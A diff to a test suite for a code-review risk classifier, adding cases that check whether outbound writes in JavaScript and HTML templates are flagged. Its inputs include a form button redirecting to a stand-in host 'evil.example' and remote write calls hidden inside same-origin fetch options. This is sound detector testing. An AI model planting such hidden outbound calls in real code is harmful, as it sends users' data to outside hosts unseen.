@@ -432,11 +432,17 @@ test('a change to the repo risk policy file is tier 2, a nested file of that nam
   assert.equal(tier(file('docs/.github/risk-paths.txt', { add: ['x'] })), 1);
 });
 
-test('risk-tier.mjs without --pr takes risk-paths.txt from the base ref, not the working tree', () => {
+test('risk-tier.mjs without --pr takes risk-paths.txt from the base ref, not the working tree, from any directory', () => {
   const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'bstack-tier-cli-'));
   const git = (...a) => execFileSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' });
-  const cli = () => JSON.parse(execFileSync(process.execPath, [SCRIPT, '--base', 'main'], { cwd: repo, encoding: 'utf8' }));
   const listed = 'listed in .github/risk-paths.txt: app/main.py';
+  const tier2FromRootAndSubdir = () => {
+    for (const cwd of [repo, path.join(repo, 'app')]) {
+      const r = JSON.parse(execFileSync(process.execPath, [SCRIPT, '--base', 'main'], { cwd, encoding: 'utf8' }));
+      assert.equal(r.tier, 2, `${cwd}: ${r.reasons.join('; ')}`);
+      assert.ok(r.reasons.includes(listed), `${cwd}: ${r.reasons.join('; ')}`);
+    }
+  };
   try {
     git('init', '-q', '-b', 'main');
     fs.mkdirSync(path.join(repo, '.github'));
@@ -448,10 +454,10 @@ test('risk-tier.mjs without --pr takes risk-paths.txt from the base ref, not the
     git('checkout', '-q', '-b', 'feat');
     fs.writeFileSync(path.join(repo, 'app', 'main.py'), 'x = 1\n');
     fs.writeFileSync(path.join(repo, '.github', 'risk-paths.txt'), '# edited locally\n');
-    assert.ok(cli().reasons.includes(listed));
+    tier2FromRootAndSubdir();
     fs.rmSync(path.join(repo, '.github', 'risk-paths.txt'));
     git('commit', '-q', '-am', 'drop the policy');
-    assert.ok(cli().reasons.includes(listed));
+    tier2FromRootAndSubdir();
   } finally {
     fs.rmSync(repo, { recursive: true, force: true });
   }
@@ -618,6 +624,96 @@ test('a huge line of unclosed form tags costs about as much as a same-size line 
   const forms = fastest(lineOf('form'));
   const plain = fastest(lineOf('from'));
   assert.ok(forms < 50 * plain, `forms ${forms} ns, plain ${plain} ns`);
+});
+
+const OUTBOUND = p => `outbound call with side effects: ${p}`;
+
+test('#147: a same-origin write formatted over several lines or with a nested options object is not an outbound call', () => {
+  for (const [p, add] of [
+    ['static/app.js', ["fetch('/api/save', {", "  method: 'POST',", '  body,', '});']],
+    ['static/app.js', ["fetch('/api/save', {method:'POST', headers:{'Content-Type':'application/json'}, body})"]],
+    ['templates/save.html', ['<form', '  method="post"', '  action="/save">']],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(!r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 1, `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('#147: the multi-line and nested shapes to an absolute or non-app template URL are still outbound', () => {
+  for (const [p, add] of [
+    ['static/app.js', ["fetch('https://api.example.com/save', {", "  method: 'POST',", '  body,', '});']],
+    ['static/app.js', ['fetch(`${apiBase}/save`, {', "  method: 'POST',", '  body,', '});']],
+    ['static/app.js', ["fetch('https://api.example.com/save', {method:'POST', headers:{'Content-Type':'application/json'}, body})"]],
+    ['static/app.js', ["fetch('/save', {method:'POST', headers:{'X-A':'1'}, baseURL: 'https://api.example.com'})"]],
+    ['static/app.js', ["fetch('/save', {", "  method: 'POST',", "  agent: { base: 'https://api.example.com' },", '});']],
+    ['templates/pay.html', ['<form', '  method="post"', '  action="https://pay.example.com/charge">']],
+    ['templates/pay.html', ['<form', '  method="post"', '  action="{{ payment_gateway_url }}/charge">']],
+    ['templates/pay.html', ['<form', '  method="post"', '  action="/x"><button formaction="https://evil.example/x">']],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 2);
+  }
+});
+
+test('#147: a write method in a later, separate statement than its same-origin fetch is still outbound', () => {
+  const p = 'static/app.js';
+  for (const add of [
+    ["fetch('/api/save', {", '  body,', '});', "init.method = 'POST';"],
+    ['const opts = { body };', "fetch('/api/save', opts);", "opts.method = 'POST';"],
+    ["fetch('/api/save', { body }); const opts = {", "  method: 'POST',", '};', 'send(opts);'],
+    ["// fetch('/api/save', {", "  method: 'POST',", '});'],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 2);
+  }
+  const split = riskTier(hunk(p, ["+fetch('/api/save', {", '   body,', "+  method: 'POST',", '+});']).join('\n'));
+  assert.ok(split.reasons.includes(OUTBOUND(p)), `method in another added block: ${split.reasons.join('; ')}`);
+});
+
+test('#147: a write call nested in a same-origin fetch\'s options is still outbound', () => {
+  const p = 'static/app.js';
+  for (const add of [
+    ["fetch('/api/log', { body: String(await fetch(remoteUrl, { method: 'POST' })) })"],
+    ["fetch('/api/log', { body: JSON.stringify(await post(remote, { method: 'POST' })) })"],
+    ["fetch('/api/log', {", '  body: await send(remoteUrl, {', "    method: 'DELETE',", '  }),', '})'],
+    ["fetch('/api/log', { body: `${await fetch(remoteUrl, { method: 'POST' })}` })"],
+    ["fetch('/api/log', {", "  method: 'POST',", "  body: `${await fetch(remoteUrl, { method: 'DELETE' })}`,", '})'],
+  ]) {
+    const r = outcome(p, { add });
+    assert.ok(r.reasons.includes(OUTBOUND(p)), `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+    assert.equal(r.tier, 2);
+  }
+});
+
+test('#147: a semicolon inside a quoted option and an app-path formaction keep the exemption', () => {
+  for (const [p, add] of [
+    ['static/app.js', ["fetch('/api/x', {method:'POST', body: 'a;b'})"]],
+    ['static/app.js', ["fetch('/api/x', {", "  method: 'POST',", "  headers: {'Content-Type': 'application/json; charset=utf-8'},", '});']],
+    ['templates/save.html', ['<form method="post" action="/save"><button formaction="/save/draft">']],
+    ['templates/save.html', ['<form', '  method="post"', '  action="/save">', '  <button formaction="{{ base }}/save/draft">Draft</button>']],
+  ]) {
+    const r = outcome(p, { add });
+    assert.equal(r.tier, 1, `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+  }
+  for (const add of [['<form', '  method="post"', '  action="/save">', '  <button formaction="{{ payment_url }}/x">'], ['<form method="post" action="/save"><button formaction=/x>']]) {
+    const r = outcome('templates/save.html', { add });
+    assert.equal(r.tier, 2, `${add.join(' / ')}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('#147: a huge added block of unclosed fetch calls costs about as much as a same-size block without them', () => {
+  const blockOf = call => [`${call}('/x', {`, "  method: 'POST',", ...Array.from({ length: 20000 }, () => `${call}('/x', {` + '{a:1},'.repeat(10))];
+  const fastest = add => Math.min(...[1, 2, 3].map(() => {
+    const started = process.hrtime.bigint();
+    outcome('static/big.js', { add });
+    return Number(process.hrtime.bigint() - started);
+  }));
+  const fetches = fastest(blockOf('fetch'));
+  const plain = fastest(blockOf('fletch'));
+  assert.ok(fetches < 50 * plain, `fetches ${fetches} ns, plain ${plain} ns`);
 });
 
 test('a file named like a test but not counted as a test keeps the auth rule', () => {
